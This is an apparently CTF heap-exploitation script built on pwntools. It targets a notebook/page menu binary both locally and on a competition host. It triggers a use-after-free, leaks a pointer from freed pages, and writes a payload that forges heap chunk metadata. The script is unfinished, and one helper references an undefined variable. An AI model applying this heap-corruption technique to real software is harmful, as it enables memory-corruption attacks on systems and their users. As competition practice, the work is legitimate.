#!/usr/bin/env python3

from pwn import *

# ----------- Configuration ------------

# Configure accordingly
BINARY = './main'
BINARY = './ex'
HOST, PORT = 'localhost', 1337
LIBC = None#'./libc.so.6'
LD   = None#'./ld-linux-x86-64.so.2'
LIBC = './libc.so.6'
LD   = './ld-2.27.so'

# Pwntools context
context.arch = 'amd64'
context.terminal = ['tmux', 'new-window']
context.aslr = None
context.aslr = True

# Load binaries
elf  = ELF(BINARY)
libc = ELF(LIBC) if LIBC else None

# Breakpoints
gdb_breakpoints=[]

# GDB init commands
gdb_commands=[]


# ----------- Helpers ------------

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split(b'-')[0], 16)


# ----------- Launchers ------------

def make_gdbscript(p=None):
    script = "handle SIGALRM ignore\n"

    base = 0

    # PIE case (TODO fix this)
    #if p is not None:
    #    base = get_base_address(p)
    #    script += "set $_base = 0x{:x}\n".format(base)

    for bp in gdb_breakpoints:
        script += "b *0x%x\n"%(base + bp)

    for line in gdb_commands:
        script += f"{line}\n"

    return script

def gdb_attach(p):
    return gdb.attach(p, gdbscript=make_gdbscript(p=p))

def run_debug(binary, libc=None, ld=None):
    args = []
    kwargs = {}
    if libc:
        log.info('Running preloading libc "%s"' % libc)
        if ld:
            args.append(ld)
        else:
            log.warn('Using custom libc, however no loader provided. This may cause a crash')
        kwargs['env'] = {'LD_PRELOAD': libc}

    args.append(binary)
    kwargs["gdbscript"] = make_gdbscript()
    return gdb.debug(args, **kwargs)

def run_plain(binary, libc=None, ld=None):
    args = []
    kwargs = {}
    if libc:
        log.info('Running preloading libc "%s"' % libc)
        if ld:
            args.append(ld)
        else:
            log.warn('Using custom libc, however no loader provided. This may cause a crash')
        kwargs['env'] = {'LD_PRELOAD': libc}

    args.append(binary)
    #return process(args, **kwargs,)
    #return process(args, **kwargs, stdout=process.PTY)
    return process(args, **kwargs, stdout=process.PTY, stdin=process.PTY)

def start():
    if args.REMOTE:
        log.info("REMOTE PROCESS")
        HOST, PORT = 'blackhat4-52ae12a60181c296037024a91e88c613-0.chals.bh.ctf.sa', 443                                                                                                      
        return remote(HOST, PORT, ssl=True, sni=HOST)
        return remote(HOST, PORT)

    elif args.DBG or args.DEBUG:
        log.info("LOCAL PROCESS (DEBUG)")
        return run_debug(BINARY, libc=LIBC, ld=LD)

    else:
        log.info("LOCAL PROCESS")
        return run_plain(BINARY, libc=LIBC, ld=LD)

# ----------- Functions -------------


def pad(msg,sz, p=b'\0'):
    return msg + p*(sz-len(msg))

def new_notebook():
    p.sendafter(b'>', pad(b'1',9))

def edit_notebook(content):
    p.sendafter(b'>', pad(b'2',9))
    p.sendafter(b"Content:", pad(content, 0x2000))

def delete_notebook():
    p.sendafter(b'>', pad(b'3',9))

def show_notebook():
    p.sendafter(b'>', pad(b'4',9))
    p.recvuntil(b'OUTPUT: ')
    o = p.recvuntil(b'\n1- New notebook', drop=True)
    return o

def new_page(size):
    p.sendafter(b'>', pad(b'5',9))
    assert size >= 0x600
    p.sendafter(b'page size:', pad(str(size).encode(),9))
    p.recvuntil(b'You got new page at index')
    o = p.recvuntil(b'\n1- New notebook', drop=True)
    return int(o)

def edit_page(idx, content):
    p.sendafter(b'>', pad(b'6',9))
    p.sendafter(b'index:', pad(str(idx).encode(),9))
    p.sendafter(b"content:", content)

def delete_page(idx):
    p.sendafter(b'>', pad(b'7',9))
    p.sendafter(b'index:', pad(str(idx).encode(),9))

def show_page(size):
    p.sendafter(b'>', pad(b'8',9))
    p.sendafter(b'index:', pad(str(idx).encode(),9))
    p.recvuntil(b'OUTPUT:')
    o = p.recvuntil(b'\n1- New notebook', drop=True)
    return o


# ----------- Main Logic ------------

# Define GDB breakpoints before starting
# gdb_breakpoints.append(0x0040066a)

# Define any extra GDB command to be executed
# (this is exec after breakpoints are set)
gdb_commands.append("heap-analysis-helper")

# Launch the process
p = start()

# Uncomment this for attaching a debugger
#gdb_attach(p)


p.interactive()

#libc = ELF("/usr/lib/libc.so.6")
#libc = ELF("libc.so.6")
#libc_atoi = libc.symbols["atoi"]
#libc_system = libc.symbols["system"]
#off = libc_system - libc_atoi
#log.info(f"Libc atoi {hex(libc_atoi)}")
#log.info(f"Libc system {hex(libc_system)}")
#log.info(f"Off {hex(off)}")
new_page(0x600)

new_notebook()
delete_notebook()
a = new_page(0x600)
b = new_page(0x600) 
c = new_page(0x600) 

delete_page(a)
delete_page(b)
o = show_notebook()
leak = u64(pad(o, 8))
log.info(hex(leak))

p.interactive()
# v
payload = b''
payload += b'A'*0x600
payload += p64(0)          # prev size
payload += p64(0x700)      # size
payload += p64(0)          # fwd
payload += p64(0x41414141) # bk
edit_notebook(payload)







# Profit
p.interactive()

